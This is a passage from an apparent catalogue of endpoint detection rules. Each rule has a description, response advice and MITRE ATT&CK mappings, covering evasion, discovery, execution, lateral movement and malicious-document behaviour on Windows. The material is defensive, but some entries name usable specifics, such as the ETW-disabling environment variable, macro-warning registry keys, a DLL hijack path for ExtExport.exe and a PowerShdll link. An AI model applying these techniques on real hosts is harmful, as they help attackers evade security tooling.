#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Defense Evasion - Delayed Variable Expansion</summary>



#### Description

This detection identifies ‘cmd.exe’ commands being executed with delayed variable expansion enabled. Malicious actors can use delayed variable expansion to cause variables to be expanded during execution rather than before, as a way to obfuscate the contents of the command line and evade detection.

#### Recommendation

Examine the rest of the arguments being passed to cmd.exe. Malicious arguments will likely contain additional obfuscation, such as base64 encoding or character codes in place of characters. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Defense Evasion - Disable UAC via reg.exe</summary>



#### Description

This detection identifies the reg.exe tool being used to disable UAC by modifying a registry key. A malicious actor may do this to be able to run code without UAC prompts. 

#### Recommendation

Investigate the process that spawned the reg.exe command and any other processes it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Defense Evasion - Disable Windows Defender via Command Line</summary>



#### Description

This detection identifies PowerShell being used to disable Windows Defender.

#### Recommendation

Investigate the process that spawned the PowerShell command and any other processes it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Defense Evasion - Disabling Anti-Malware Scan Interface </summary>



#### Description

This detection identifies commands being run that disable AMSI, the Windows Anti-Malware Scan Interface

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Defense Evasion - Disabling ETW .NET logging</summary>



#### Description

This detection identifies the environment variable COMPlus_ETWEnabled being set to 0. By doing this, a malicious actor can prevent Event Tracing for Windows (ETW) from logging any .NET assemblies that are loaded, bypassing certain EDR detections.

#### Recommendation

Examine the parent process that spawned the command, and anything else that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable Windows Event Logging - T1562.002


</details>



<details>
<summary>Defense Evasion - Disabling Multiple Security or Backup Products</summary>



#### Description

Identifies multiple security or backup programs being disabled within a short window of time. Some malware will use batch scripts to attempt to kill security software prior to execution. Ransomware may also attempt to disable backup software.

#### MITRE ATT&CK Techniques

- Service Stop - T1489
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Defense Evasion: Disabling PowerShell Logging</summary>



#### Description

This detection identifies PowerShell logging being disabled via WMI, deletion of registry keys, or the Logman utility. A malicious actor may do this to hinder investigation. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- PowerShell - T1059.001
- Modify Registry - T1112
- Disable Windows Event Logging - T1562.002


</details>



<details>
<summary>Defense Evasion - Enabling Microsoft Office Macros via Registry</summary>



#### Description

This detection identifies ‘reg.exe’ being used to change the value of the HKCU\Software\Microsoft\Office\\Word\Security\VBAWarnings or HKCU\Software\Microsoft\Office\\Excel\Security\VBAWarnings registry keys. Malware can set the value of these keys to ‘1’, which will cause Microsoft Word and Excel to execute macros without warning the user. 

#### Recommendation

Examine the parent process for additional context on why this command was run. Determine whether any documents were opened on the system in the timeframe around the command executing. If so, attempt to acquire the documents and inspect them for suspicious macros. Investigate web proxy logs for any suspicious requests from the affected endpoint around the time that the command was run. These may be indicative of a second stage of malware being downloaded.


#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Defense Evasion - FLTMC.exe Unloading Sysmon Driver</summary>



#### Description

This detection identifies Sysmon-related drivers being unloaded using FLTMC, which is a Windows utility for managing drivers. Malicious actors may do this to prevent Sysmon from detecting their activity.


#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this activity was part of expected admin behavior. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001
- Disable Windows Event Logging - T1562.002


</details>



<details>
<summary>Defense Evasion: Obfuscated HTTP Strings</summary>



#### Description

This detection identifies the string ‘http://’ or ‘https://’ with special characters breaking up the string, such as ^. Powershell-based malware will often use a variety of obfuscation tactics to avoid detection, including breaking up strings using characters that will be ignored by the PowerShell interpreter.

#### Recommendation

Investigate the URL in the command and determine if it serves a legitimate business use. Examine the context of the URL in the command, the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Defense Evasion - Obfuscated Wscript.Shell</summary>



#### Description

This detection identifies attempts to obfuscate the string 'Wscript.shell' in the command line by breaking up the string and substituting some characters for variables, such as 'WS'+'cript.Sh'+h+'ll'. These obfuscation attempts are performed by malware that executes JavaScript via MSHta, such as Kovter.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- JavaScript - T1059.007


</details>



<details>
<summary>Defense Evasion - WMI Killing Processes</summary>



#### Description

Identifies security or backup programs being disabled using WMI. Some malware will use batch scripts to attempt to kill security software prior to execution. Ransomware may also attempt to disable backup software.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Discovery - ADFind Used</summary>



#### Description

This detection identifies the ADFind utility being run. ADFind is a utility used for Active Directory enumeration. A malicious actor may do this to gather information about a groups and systems in a domain prior to performing further malicious activity. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Domain Groups - T1069.002


</details>



<details>
<summary>Discovery - CSVDE Used to Enumerate Domain Computers</summary>



#### Description

This detection identifies the CSVDE tool being used to enumerate computers on the domain. A malicious actor may do this to identify targets for lateral movement. 

#### Recommendation

Determine whether this was part of authorized administrator activity. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018
- Account Discovery - T1087


</details>



<details>
<summary>Discovery - DSQuery Querying Computers</summary>



#### Description

This detection identifies the DSQuery utility being used to enumerate hosts in a domain. A malicious actor may use this to identify targets for lateral movement. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Discovery - Net Config</summary>



#### Description

This detection identifies the Net Config command being run. A malicious actor may do this to gather information about the system prior to performing further malicious activity. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Information Discovery - T1082


</details>



<details>
<summary>Discovery - Net.exe Enumerating Domain Users</summary>



#### Description

This detection identifies Net.exe being used to enumerate users on a domain. A malicious actor may do this to gather information about the domain users prior to performing further malicious activity. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Domain Account - T1087.002


</details>



<details>
<summary>Discovery - Redirect netstat Output to File</summary>



#### Description

This detection identifies the output from netstat, a command line tool for displaying network status information, being redirected to a file. Malicious actors use this to gather network information about a host during reconnaissance and for lateral movement.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Network Connections Discovery - T1049


</details>



<details>
<summary>DLL Search Order Hijacking - ExtExport.exe</summary>



#### Description

This detection identifies the 'ExtExport.exe' binary possibly being used to load a malicious DLL file. When a DLL named 'mozcrt19.dll', 'mozsqlite3.dll', or 'sqlite3.dll' is placed in the directory C:\Test, 'ExtExport.exe' will load that DLL upon execution. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>Execution - PowerShell System.Xml.XmlDocument</summary>



#### Description

This detection identifies the PowerShell function System.Xml.XmlDocument being used to load an XML file. Malicious XML files can be loaded in PowerShell as a System.Xml.XmlDocument object. Once loaded, arbitrary commands can be executed from the contents of the XML file.

#### Recommendation

Investigate the contents of the loaded XML file. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Execution - PowerShell via DLL</summary>



#### Description

This detection identifies PowerShdll, which is a method of running PowerShell commands by loading a DLL rather than running the ‘PowerShell.exe’ executable. It can be loaded with a number of built-in Windows utilities, including ‘rundll32.exe’, ‘regasm.exe’, ‘regsvcs.exe’, ‘InstallUtil.exe’, and ‘regsvr32.exe’. The code for PowerShdll can be found at https://github.com/p3nt4/PowerShdll

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- InstallUtil - T1218.004
- Regsvcs/Regasm - T1218.009
- Regsvr32 - T1218.010
- Rundll32 - T1218.011


</details>



<details>
<summary>Execution - RegSvr32 Executing DLL with Non-Standard File Extension</summary>



#### Description

This detection identifies ‘RegSvr.exe’ executing functions from files without a DLL or CPL file extension. RegSvr32 does not require the DLL files it runs to have a proper file extension, which allows malicious actors to give files an unrecognizable file extension.

#### Recommendation

Acquire the DLL file that was executed and examine the function that was called by RegSvr32. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Execution - RegSvr32 Loading Text File</summary>



#### Description

This detection identifies RegSvr32 being used to load a text file. Malicious code can be stored in these files, which will then be executed by RegSvr32. 


#### Recommendation

Investigate the contents of the loaded text file. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Execution - RunDLL32 DavSetCookie</summary>



#### Description

The detection identifies the DavSetCookie function of davclnt.dll, the Windows WebDAV Client library, which can be used by a malicious actor to execute a process.

#### Recommendation

Review the contents of the command being passed to ‘davclnt.dll’. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Execution - RunDll32 Executing DLL with Non-Standard File Extension</summary>



#### Description

This detection identifies ‘RunDLL32.exe’ executing functions from files without a DLL or CPL file extension. RunDLL32 does not require the DLL files it runs to have a proper file extension, which allows malicious actors to give files an unrecognizable file extension.

#### Recommendation

Acquire the DLL file that was executed and examine the function that was called by RunDLL32. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Exfiltration - Create Encrypted RAR</summary>



#### Description

This detection identifies an encrypted RAR file being created via the command line. Encrypted RAR files are often used by malicious actors to exfiltrate collected data. 


#### Recommendation

Acquire the RAR and decrypt it if the password can be retrieved from the command line arguments. Identify whether any other processes may have interacted with the RAR file or potentially uploaded it.


#### MITRE ATT&CK Techniques

- Archive Collected Data - T1560


</details>



<details>
<summary>Forensics Test - agent.jobs.windows.processes - RDP</summary>



#### Description

This is a test rule for finding processes that listen on the network and have termsrv.dll loaded as a module (Remote Desktop, Citrix, etc) inside of the forensics process listing (agent.jobs.windows.processes).

#### Recommendation

No further action is required, this is only a test.

</details>



<details>
<summary>Lateral Movement - Enable RDP via reg.exe</summary>



#### Description

This detection identifies ‘reg.exe’ being used to modify the registry to enable remote desktop access to a host. This can be done locally on a host, or over the network using a tool, such asPsExec to move laterally to the target host. 

#### Recommendation

Identify the process that is executing ‘reg.exe’, and investigate the context surrounding that parent process, such as what launched it, and what the command line arguments for the process were

#### MITRE ATT&CK Techniques

- Remote Desktop Protocol - T1021.001


</details>



<details>
<summary>Lateral Movement - Outlook Com Object</summary>



#### Description

This detection identifies a technique that could allow a malicious actor to move laterally and remotely execute code by using an Outlook COM object created by [System.Activator]::CreateInstance in PowerShell.

#### Recommendation

Review the [System.Activator]::CreateInstance command to identify targeted remote hosts and what commands the malicious actor is trying to run on those hosts. Consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Distributed Component Object Model - T1021.003
- PowerShell - T1059.001


</details>



<details>
<summary>Lateral Movement - PoisonHandler</summary>



#### Description

This detection identifies the use of the  PoisonHandler tool. This tool is used by malicious actors for  lateral movement via WMI, which executes arbitrary commands by registering them as protocol handlers.

#### Recommendation

View the contents of any WMI commands that are run on the system. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Malicious Document - Acrobat Reader Spawns Word To Open DOCM File</summary>



#### Description

This detection identifies Adobe Reader spawning Microsoft Word to open a file with a ‘.docm’ extension. This file extension is used for files containing macros. This technique is used by malicious actors to compromise endpoints by executing commands delivered by malicious documents.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - BITSADMIN PowerShell from Command Line</summary>



#### Description

This detection identifies the use of the Background Intelligent Transfer Service (BITS), ‘bitsadmin.exe’, and ‘PowerShell.exe’ to retrieve and execute a file. This technique is used by malicious actors in malicious documents, which are delivered by email to compromise the target’s endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- BITS Jobs - T1197
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Common MalDoc file name</summary>



#### Description

This behavior identifies common file names of malicious documents being opened by Microsoft Word

</details>



<details>
<summary>Malicious Document - Dropper Proxy Execution via MSIExec</summary>



#### Description

This detection identifies the use of 'msiexec.exe'  to proxy malicious code that is being executed. This technique is used by malicious actors in droppers embedded in malicious documents that are attached to emails.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Msiexec - T1218.007
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Excel SLK File Launching Process</summary>



#### Description

This detection identifies Microsoft Excel opening Symbolic Link Files (SLK) that have a `.SLK` extension. SLFs are similar to Windows Shortcuts, but more closely related to symlinks used in Unix systems. These files can be used by malicious actors to deliver malicious documents to users.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Malicious Document - Excel Spawns cmd.exe or Powershell</summary>



#### Description

This detection identifies Excel spawning ‘cmd.exe’ or PowerShell. Malicious document and spreadsheet files will often use macros that will then run ‘cmd.exe’ or PowerShell commands.


#### Recommendation

View the command being run and attempt to determine what it is doing. It may contain elements obfuscated with base64, character code substitution, or other obfuscation methods. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Windows Command Shell - T1059.003
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Excel Spawns MSHta</summary>



#### Description

This detection identifies Microsoft Excel spawning ‘MSHTA.exe’, which is intended to run HTML application files (.hta). Malicious actors often weaponize MSHTA by using it to execute JavaScript code. ‘MSHTA.exe’ being executed by Microsoft Excel is an indicator that a malicious spreadsheet file may have been opened. 

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Mshta - T1218.005


</details>



<details>
<summary>Malicious Document - Excel Spawns WMIC</summary>



#### Description

This detection identifies Microsoft Excel spawning ‘WMIC.exe’. WMIC is used to run Windows Management Instrumentation (WMI) commands, which is usually done by malicious documents. ‘WMIC.exe’ being executed by Microsoft Excel is an indicator that a malicious spreadsheet file may have been opened. 

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Excel Spawns Wscript or Cscript</summary>



#### Description

This detection identifies Microsoft Excel spawning the CScript or WScript utilities. CScript and WScript are often weaponized by malicious actors to execute JavaScript or VBScript code, which is usually done by malicious documents. CScript or WScript being executed by Microsoft Excel is an indicator that a malicious spreadsheet file may have been opened.

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Visual Basic - T1059.005
- JavaScript - T1059.007
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Fake Word Experienced An Error Message</summary>



#### Description

This detection identifies the presence of a fake error message being passed to the command line. This technique is used by malicious actors to display fake error messages while their code executes on the target system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - ftype and Pipe to Find</summary>



#### Description

This detection identifies the ftype command being used and its output being piped to the find command. Ftype will list file extensions and their associations. A malicious actor may pipe this output to attempt to find a specific file association so that they can modify it. This activity can be executed in malicious documents looking for the .chm extension.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Process Discovery - T1057


</details>



<details>
<summary>Malicious Document - HH Spawns MSHTA</summary>



#### Description

This detection identifies ‘mshta.exe’ being spawned by ‘hh.exe’, which opens Microsoft Compiled HTML ‘.chm’. These files are sent from malicious actors to targets to run commands using built-in Windows utilities, such as ‘MSHTA.exe’, which executes scripts or downloads malware to the endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Signed Binary Proxy Execution - T1218
- Compiled HTML File - T1218.001
- Mshta - T1218.005
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Imposter Document</summary>



#### Description

This detection identifies processes that the creator is attempting to disguise as a document by including the .doc or .docx extension in the file name. By default, Windows hides file extensions, so the real file extension will be hidden and the file will appear to be a document file.

#### Recommendation

Review the executable that is named to look like a document. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Internet Explorer Opening MHT File Inside Zip Archive</summary>



#### Description

This detection identifies Internet Explorer opening an HTML Application (.mht) file from within a Zip archive. The delivery of an MHT file within an archive is a technique used to deliver malicious documents to victims via email attachments.

#### Recommendation

Review the MHT file in question, as well as the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Compiled HTML File - T1218.001
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Microsoft Office Spawns Process From Temp Directory</summary>



#### Description

This detection identifies processes spawned by Microsoft Office applications from temporary directories. This behavior is often associated with malicious documents.

#### Recommendation

Attempt to determine what documents may have been opened by the user prior to this activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Microsoft Publisher Spawns MSHTA</summary>



#### Description

This detection identifies suspicious processes spawned by Microsoft Office applications, which could indicate that a malicious actor is using a malicious document. These malicious documents leverage macros, which are small Visual Basic for Applications (VBA) scripts embedded inside of Microsoft Office documents, such as Word, PowerPoint, and Excel. Macros run commands using built-in Windows utilities to download malware and compromise the system. Other methods to execute malicious code in an Office document include using Dynamic Data Exchange objects or exploiting software vulnerabilities. Malicious actors use phishing emails to send malicious documents.

#### Recommendation

Review the URL passed to ‘mshta.exe’ to identify if it is from a trusted source., Review the firewall and web proxy logs from this endpoint to identify any malware retrieval from remote systems. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Signed Binary Proxy Execution - T1218
- Mshta - T1218.005
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Microsoft Publisher Spawns PowerShell</summary>



#### Description

This detection identifies suspicious processes spawned by Microsoft Office applications, which could indicate that a malicious actor is using a malicious document. These malicious documents leverage macros, which are small Visual Basic for Applications (VBA) scripts embedded inside of Microsoft Office documents, such as Word, PowerPoint, and Excel. Macros run commands using built-in Windows utilities to download malware and compromise the system. Other methods to execute malicious code in an Office document include using Dynamic Data Exchange objects or exploiting software vulnerabilities. Malicious actors use phishing emails to send malicious documents.

#### Recommendation

Review the command passed to PowerShell to determine if it is malicious activity. A malicious actor could pass commands to PowerShell obfuscated or encoded using compression tools, such as Base64 or gzip. Review the firewall and web proxy logs from this endpoint to identify any malware retrieval from remote systems.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Microsoft Word Spawns MSHTA</summary>



#### Description

This detection identifies suspicious processes spawned by Microsoft Office applications, which could indicate that a malicious actor is using a malicious document. These malicious documents leverage macros, which are small Visual Basic for Applications (VBA) scripts embedded inside of Microsoft Office documents, such as Word, PowerPoint, and Excel. Macros run commands using built-in Windows utilities to download malware and compromise the system. Other methods to execute malicious code in an Office document include using Dynamic Data Exchange objects or exploiting software vulnerabilities. Malicious actors use phishing emails to send malicious documents.

#### Recommendation

Review the URL passed to 'mshta.exe' to determine if it is from a trusted source., Review the firewall and web proxy logs from this endpoint to identify any malware retrieval from remote systems.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Signed Binary Proxy Execution - T1218
- Mshta - T1218.005
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Microsoft Word Spawns PowerShell</summary>



#### Description

This detection identifies suspicious processes spawned by Microsoft Office applications, which could indicate that a malicious actor is using a malicious document. These malicious documents leverage macros, which are small Visual Basic for Applications (VBA) scripts embedded inside of Microsoft Office documents, such as PowerPoint, Excel and Word. Macros run commands using built-in Windows utilities, such as PowerShell, to download malware and compromise the system. Other methods to execute malicious code in an Office document include using Dynamic Data Exchange objects or exploiting software vulnerabilities. Malicious actors use phishing emails to send malicious documents.

#### Recommendation

Review the command passed to PowerShell to determine if it is malicious activity. A malicious actor could pass  commands to PowerShell obfuscated or encoded using compression tools, such as Base64 or gzip. Review the firewall and web proxy logs from this endpoint to identify any malware retrieval from remote systems.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - MSHTA Retrieves From Remote Server</summary>



#### Description

This detection identifies the use of ‘mshta.exe’ to retrieve a file hosted on a remote web server. ‘mshta.exe’ is a built-in Windows utility a malicious actor uses to execute an HTML application or ‘.hta’ files. Malicious actors send malicious documents that use ‘mshta.exe’ to execute VBScript or JavaScript, and to download additional payloads.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- User Execution - T1204
- Malicious File - T1204.002
- Signed Binary Proxy Execution - T1218
- Mshta - T1218.005
- Phishing - T1566
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Malicious Document - MSHTA Spawned by PowerShell, WScript, CScript or CMD</summary>



#### Description

This detection identifies scripting engines and command interpreters that are child processes of the Microsoft HyperText Application executable, ‘MSHTA.exe.’, which is often used by malicious documents. 


#### Recommendation

Review the HTA file being opened. HTA files can be examined in a text editor. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Mshta - T1218.005


</details>



<details>
<summary>Malicious Document - MSHTA Spawns WinVer</summary>



#### Description

This detection identifies the mshta.exe application spawning winver.exe. Winver is used to determine the version of Windows currently running. This technique has been observed used by malicious actors delivering malicious documents to victims.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Mshta - T1218.005


</details>



<details>
<summary>Malicious Document - MS Office Equation Editor Exploit</summary>



#### Description

This detection identifies any process being launched by the Microsoft Equation Editor utility, ‘eqnedt32.exe’, which a malicious actor could exploit to execute code. This technique is used by malicious actors to deliver malicious documents by email to compromise the target’s endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203
- Phishing - T1566
- Spearphishing Attachment - T1566.001
- Obtain Capabilities - T1588
- Exploits - T1588.005


</details>



<details>
<summary>Malicious Document - ODBCConf Spawned By WScript</summary>



#### Description

This detection identifies ‘odbcconf.exe’, which is a command line tool that allows you to configure ODBC drivers and data source names, as a child process of wscript. Malicious actors use ODBCConf to execute DLL files that are attached to a malicious document being sent to a target. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - ODBCConf Writes File To Users</summary>



#### Description

This detection identifies ODBCConf writing a file to the Users directory. Malicious actors use ODBCConf to execute DLL files that are attached to a malicious document being sent to a target.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Malicious Document - Office Spawning MSBuild</summary>



#### Description

This detection identifies Microsoft Office processes spawning ‘MSBuild.exe’, which is the result of various droppers or downloaders using ‘MSBuild.exe’ to compile and execute arbitrary code. This technique is used by malicious actors to subvert antivirus and other defensive countermeasures. The executed file is visible within the command line parameters of the process start event.

#### Recommendation

Acquire additional process artifacts and identify the root cause of the suspicious process invocation. The source could be a malicious document sent by a malicious actor to the user by email. Investigate the user's inbox to identify any malicious emails, and determine if any other users received the email. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Compile After Delivery - T1027.004
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Malicious Document - Regsvr32 Spawned By Word, MSPub or Excel</summary>



#### Description

This detection identifies 'regsvr32.exe' being spawned by 'word.exe' or 'mspub.exe', which could be caused by malicious actors sending documents as email attachments to targets. These malicious documents could contain or retrieve malware from other systems to be executed on the target’s endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Malicious Document - VBS Document Imposter</summary>



#### Description

This detection identifies VBS files that the creator is attempting to disguise as a document by including the .doc or .docx extension in the file name. By default Windows hides file extensions, so the real file extension will be hidden and the file will appear to be a document file.

#### Recommendation

Analyze the VBScript file. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
